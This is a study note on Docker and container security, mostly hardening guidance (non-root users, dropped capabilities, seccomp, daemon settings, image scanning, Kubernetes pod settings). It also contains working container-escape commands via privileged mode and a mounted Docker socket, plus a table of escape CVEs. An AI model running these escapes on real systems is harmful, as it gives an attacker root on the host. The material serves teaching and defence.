---
title: Container & Docker Security
tags:
  - intermediate
topic: Container Security
difficulty: intermediate
created: 2026-03-26
updated: 2026-03-26
source: NIST SP 800-190, CIS Docker benchmark, Docker security documentation, OWASP Docker Security Cheat Sheet
---

# 🐳 Container & Docker Security

## Overview
Containers package applications and their dependencies into isolated, portable units. Docker is the dominant container runtime; Kubernetes (K8s) is the dominant orchestration platform. Containers have unique security properties — they share the host kernel, which creates attack surfaces that traditional VMs do not have. Understanding container security is essential for modern infrastructure roles.

**Source of truth:** NIST SP 800-190 (Application Container Security Guide) is the authoritative government reference for container security.

---

## Container vs VM — Security Comparison

| Property | Virtual Machine | Container |
|---|---|---|
| Isolation | Separate kernel | Shared host kernel |
| Attack surface | Hypervisor escape only | Kernel + namespaces + cgroups |
| Image size | GBs (full OS) | MBs (app + deps only) |
| Boot time | Minutes | Seconds/milliseconds |
| Privilege separation | Strong — hypervisor layer | Depends on config |
| Breakout impact | Compromise of 1 VM | Potential host compromise if root in container |

---

## Docker Architecture

```
Docker Client (CLI) ←→ Docker Daemon (dockerd) ←→ Container Runtime (containerd → runc)
                                ↕
                         Docker Registry (Docker Hub / private)
                                ↕
                           Docker Images
                                ↕
                          Running Containers
```

**Key components:**
- **Docker daemon:** Runs as root by default — significant attack surface
- **Images:** Read-only layered filesystems built from Dockerfiles
- **Containers:** Running instances of images — writable layer on top of image
- **Registry:** Stores and distributes images (Docker Hub, AWS ECR, GCR, private)

---

## Common Docker Security Issues

### 1. Running as Root Inside Containers

By default, containers run as root (UID 0). If an attacker escapes the container, they have root on the host.

```dockerfile
# BAD — runs as root (default)
FROM ubuntu:22.04
RUN apt-get install -y myapp
CMD ["/myapp"]

# GOOD — runs as non-root user
FROM ubuntu:22.04
RUN apt-get install -y myapp && \
    useradd -m -u 1001 appuser
USER appuser
CMD ["/myapp"]
```

```bash
# Check who a container is running as
docker exec CONTAINER_ID whoami
docker inspect CONTAINER_ID | grep -i user
```

### 2. Privileged Containers

`--privileged` gives the container nearly all capabilities of the host. Should almost never be used.

```bash
# BAD
docker run --privileged myimage

# Check for privileged containers
docker inspect CONTAINER_ID | grep Privileged
```

**Container escape via privileged mode:**
```bash
# If you land in a privileged container:
fdisk -l                        # Find host disks
mkdir /mnt/hostfs
mount /dev/sda1 /mnt/hostfs    # Mount host filesystem
chroot /mnt/hostfs              # Chroot to host → full host access
```

### 3. Exposed Docker Socket

Mounting the Docker socket into a container gives that container full control over the Docker daemon — equivalent to root on the host.

```bash
# BAD — never do this in production
docker run -v /var/run/docker.sock:/var/run/docker.sock myimage

# If you find a container with the socket mounted:
docker -H unix:///var/run/docker.sock ps          # List all containers on host
docker -H unix:///var/run/docker.sock run -it --privileged --net=host -v /:/mnt alpine chroot /mnt
```

### 4. Image Vulnerabilities

Outdated base images contain known CVEs. Regularly scan images.

```bash
# Scan with Trivy (free, fast)
trivy image ubuntu:20.04
trivy image myapp:latest

# Scan with Grype
grype myapp:latest

# Docker Scout (built into Docker Desktop)
docker scout cves myimage:tag

# Snyk container scan
snyk container test myimage:tag
```

### 5. Secrets in Images

Environment variables and build-time ARGs are visible in image history.

```bash
# View image build history — exposes secrets passed as ARG
docker history myimage

# View environment variables
docker inspect CONTAINER_ID | grep -A 20 '"Env"'
```

```dockerfile
# BAD — secret in ENV or ARG
ARG DB_PASSWORD=supersecret
ENV DB_PASSWORD=supersecret

# GOOD — use Docker secrets or runtime injection
# At runtime: docker run -e DB_PASSWORD="$(vault read secret/db)" myimage
# Or use Docker Swarm secrets / Kubernetes Secrets
```

### 6. Excessive Capabilities

Linux capabilities can be added or dropped. Default Docker containers run with a reduced set but still include potentially dangerous capabilities.

```bash
# List capabilities of a container
docker inspect CONTAINER_ID | grep -A 20 CapAdd

# Run with minimal capabilities (drop all, add only what's needed)
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myimage

# Dangerous capabilities to audit:
# CAP_SYS_ADMIN → almost equivalent to root
# CAP_NET_ADMIN → network configuration
# CAP_SYS_PTRACE → attach to processes (debugging, pivoting)
```

---

## Docker Security Best Practices

### Dockerfile Hardening

```dockerfile
# Use specific, minimal base images — not latest
FROM python:3.11-slim AS base    # Not: FROM python:latest

# Use multi-stage builds to reduce attack surface
FROM python:3.11-slim AS builder
RUN pip install --user -r requirements.txt

FROM python:3.11-slim AS final   # Clean image without build tools
COPY --from=builder /root/.local /root/.local
COPY app.py /app/

# Run as non-root
RUN useradd -m -u 1001 appuser
USER appuser

# Read-only filesystem where possible
# (set at runtime: docker run --read-only)

# Health check
HEALTHCHECK --interval=30s --timeout=10s \
  CMD curl -f http://localhost:8080/health || exit 1

# Don't expose unnecessary ports
EXPOSE 8080

# Don't use ENTRYPOINT or CMD with shell form (avoids signal handling issues)
CMD ["/app/app.py"]   # Exec form
```

### Runtime Security

```bash
# Read-only root filesystem
docker run --read-only myimage

# No new privileges
docker run --security-opt=no-new-privileges myimage

# Drop all capabilities, add only needed
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myimage

# Limit resources (prevent DoS)
docker run --memory=512m --cpus=1.0 myimage

# Use non-root namespace (user namespacing)
# Configure in /etc/docker/daemon.json:
# {"userns-remap": "default"}

# Enable seccomp profile (restricts syscalls)
docker run --security-opt seccomp=/etc/docker/seccomp-default.json myimage

# Enable AppArmor profile
docker run --security-opt apparmor=docker-default myimage
```

### Daemon Hardening

```json
// /etc/docker/daemon.json
{
  "icc": false,                         // Disable inter-container communication by default
  "userns-remap": "default",            // User namespace remapping
  "no-new-privileges": true,            // Prevent privilege escalation
  "live-restore": true,                 // Keep containers running during daemon updates
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  }
}
```

---

## Container Escape Techniques

> For authorised penetration testing and CTF use only.

### Check Container Environment
```bash
# Are we in a container?
cat /proc/1/cgroup    # Contains "docker" or container ID if in container
ls /.dockerenv        # File exists in Docker containers
env | grep -i kube    # Kubernetes env vars

# Check capabilities
cat /proc/self/status | grep CapEff
# Convert hex to capabilities:
capsh --decode=00000000a80425fb
```

### Escape via Privileged Container
```bash
# If: docker inspect shows "Privileged: true"
fdisk -l
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
chroot /tmp/hostfs   # Host filesystem access
```

### Escape via Docker Socket
```bash
# If: ls /var/run/docker.sock exists inside container
docker -H unix:///var/run/docker.sock run -it --privileged \
  --net=host -v /:/mnt alpine chroot /mnt
```

### Escape via CVE (Kernel Exploits)
Notable container escape CVEs:
| CVE | Name | Description |
|---|---|---|
| CVE-2019-5736 | runc escape | Overwrite host runc binary from container |
| CVE-2020-15257 | Shim Escape | Containerd API access via abstract namespace socket |
| CVE-2022-0185 | Kernel FS vuln | Privilege escalation in kernel |
| CVE-2024-21626 | Leaky Vessels | runc working directory escape |

---

## Kubernetes Security Basics

Kubernetes (K8s) orchestrates containers at scale. Key security concepts:

```yaml
# Pod Security — run as non-root, read-only filesystem
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
  containers:
  - name: myapp
    image: myapp:1.0
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
```

**Key K8s security areas:**
- **RBAC:** Role-Based Access Control — define who can do what in the cluster
- **Network Policies:** Restrict pod-to-pod communication (default: allow all)
- **Secrets management:** Use Kubernetes Secrets or external vaults (HashiCorp Vault)
- **Pod Security Admission (PSA):** Enforces security standards (Baseline, Restricted, Privileged)
- **Image scanning:** Scan all images before admission (OPA Gatekeeper, Trivy Operator)
- **Audit logging:** Enable API server audit logs for forensic capability

---

## CIS Docker Benchmark

The Center for Internet Security publishes the Docker Benchmark — a comprehensive hardening guide. Key checks:

```bash
# Automated check with Docker Bench Security
docker run --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security
```

---

## Related Notes
- Cloud-Security-Fundamentals
- Linux-Privilege-Escalation
- Vulnerability-Management
- Network-Defense-Blue-Team

## Sources

National Institute of Standards and Technology. (2017). *Application container security guide* (NIST SP 800-190). U.S. Department of Commerce. https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf

Center for Internet Security. (2023). *CIS benchmark for Docker*. CIS. https://www.cisecurity.org/benchmark/docker

Docker. (2024). *Docker security documentation*. Docker Inc. https://docs.docker.com/engine/security/

OWASP Foundation. (2024). *Docker security cheat sheet*. OWASP. https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html

---
<- [[Fundamentals-MOC]]